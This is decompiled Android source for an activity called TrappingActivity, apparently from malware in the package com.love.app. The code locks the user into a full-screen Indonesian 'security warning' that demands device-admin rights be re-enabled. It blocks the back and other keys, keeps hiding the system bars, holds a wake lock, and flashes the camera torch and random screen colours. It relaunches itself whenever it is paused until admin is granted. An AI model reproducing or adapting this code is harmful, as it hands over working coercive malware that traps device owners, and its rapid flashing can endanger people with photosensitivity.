package com.love.app;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.view.KeyEvent;
import android.view.View;
import android.widget.TextView;
import androidx.core.view.ViewCompat;

/* JADX INFO: loaded from: classes.dex */
public class TrappingActivity extends Activity {
    private String cameraId;
    private CameraManager cameraManager;
    private Handler handler = new Handler();
    private boolean isFlashing = false;
    private boolean torchOn = false;
    private PowerManager.WakeLock wakeLock;

    @Override // android.app.Activity
    public void onBackPressed() {
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().addFlags(6825089);
        if (Build.VERSION.SDK_INT >= 27) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        }
        TextView textView = new TextView(this);
        textView.setText("⚠️ PERINGATAN KEAMANAN ⚠️\n\nDevice admin telah dinonaktifkan.\nAktifkan kembali untuk menggunakan perangkat.\n\nTombol fisik tidak akan berfungsi.");
        textView.setTextSize(20.0f);
        textView.setGravity(17);
        textView.setPadding(50, 50, 50, 50);
        textView.setTextColor(-1);
        textView.setBackgroundColor(ViewCompat.MEASURED_STATE_MASK);
        setContentView(textView);
        setFinishOnTouchOutside(false);
        hideSystemUI();
        PowerManager.WakeLock wakeLockNewWakeLock = ((PowerManager) getSystemService("power")).newWakeLock(268435482, "TrappingActivity::Lock");
        this.wakeLock = wakeLockNewWakeLock;
        wakeLockNewWakeLock.acquire(1800000L);
        CameraManager cameraManager = (CameraManager) getSystemService("camera");
        this.cameraManager = cameraManager;
        try {
            this.cameraId = cameraManager.getCameraIdList()[0];
        } catch (Exception unused) {
        }
        startTorchFlashing();
        startScreenFlashing();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void hideSystemUI() {
        View decorView = getWindow().getDecorView();
        decorView.setSystemUiVisibility(5894);
        decorView.setOnSystemUiVisibilityChangeListener(new View.OnSystemUiVisibilityChangeListener() { // from class: com.love.app.TrappingActivity$$ExternalSyntheticLambda0
            @Override // android.view.View.OnSystemUiVisibilityChangeListener
            public final void onSystemUiVisibilityChange(int i) {
                this.f$0.m366lambda$hideSystemUI$0$comloveappTrappingActivity(i);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$hideSystemUI$0$com-love-app-TrappingActivity, reason: not valid java name */
    /* synthetic */ void m366lambda$hideSystemUI$0$comloveappTrappingActivity(int i) {
        if ((i & 4) == 0) {
            this.handler.postDelayed(new Runnable() { // from class: com.love.app.TrappingActivity$$ExternalSyntheticLambda2
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.hideSystemUI();
                }
            }, 500L);
        }
    }

    private void startTorchFlashing() {
        if (this.cameraId != null) {
            this.isFlashing = true;
            this.handler.post(new Runnable() { // from class: com.love.app.TrappingActivity.1
                @Override // java.lang.Runnable
                public void run() {
                    if (TrappingActivity.this.isFlashing) {
                        try {
                            TrappingActivity trappingActivity = TrappingActivity.this;
                            trappingActivity.torchOn = !trappingActivity.torchOn;
                            TrappingActivity.this.cameraManager.setTorchMode(TrappingActivity.this.cameraId, TrappingActivity.this.torchOn);
                        } catch (CameraAccessException unused) {
                        }
                        TrappingActivity.this.handler.postDelayed(this, 300L);
                    }
                }
            });
        }
    }

    private void stopTorch() {
        this.isFlashing = false;
        if (this.cameraId != null) {
            try {
                this.cameraManager.setTorchMode(this.cameraId, false);
            } catch (Exception unused) {
            }
        }
    }

    private void startScreenFlashing() {
        this.handler.post(new Runnable() { // from class: com.love.app.TrappingActivity.2
            @Override // java.lang.Runnable
            public void run() {
                if (TrappingActivity.this.isFlashing) {
                    TrappingActivity.this.getWindow().getDecorView().setBackgroundColor(Color.rgb((int) (Math.random() * 255.0d), (int) (Math.random() * 255.0d), (int) (Math.random() * 255.0d)));
                    TrappingActivity.this.handler.postDelayed(this, 200L);
                }
            }
        });
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (i == 26) {
            return super.onKeyDown(i, keyEvent);
        }
        return true;
    }

    @Override // android.app.Activity
    protected void onPause() {
        super.onPause();
        this.handler.postDelayed(new Runnable() { // from class: com.love.app.TrappingActivity$$ExternalSyntheticLambda1
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m367lambda$onPause$1$comloveappTrappingActivity();
            }
        }, 300L);
    }

    /* JADX INFO: renamed from: lambda$onPause$1$com-love-app-TrappingActivity, reason: not valid java name */
    /* synthetic */ void m367lambda$onPause$1$comloveappTrappingActivity() {
        if (isFinishing()) {
            return;
        }
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService("device_policy");
        if (devicePolicyManager != null && devicePolicyManager.isAdminActive(new ComponentName(this, (Class<?>) AdminReceiver.class))) {
            return;
        }
        Intent intent = new Intent(this, (Class<?>) TrappingActivity.class);
        intent.addFlags(805306368);
        startActivity(intent);
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
        hideSystemUI();
        if (!this.isFlashing) {
            this.isFlashing = true;
            startTorchFlashing();
            startScreenFlashing();
        }
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService("device_policy");
        ComponentName componentName = new ComponentName(this, (Class<?>) AdminReceiver.class);
        if (devicePolicyManager == null || !devicePolicyManager.isAdminActive(componentName)) {
            return;
        }
        finish();
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        this.isFlashing = false;
        this.handler.removeCallbacksAndMessages(null);
        PowerManager.WakeLock wakeLock = this.wakeLock;
        if (wakeLock != null && wakeLock.isHeld()) {
            this.wakeLock.release();
        }
        stopTorch();
    }
}
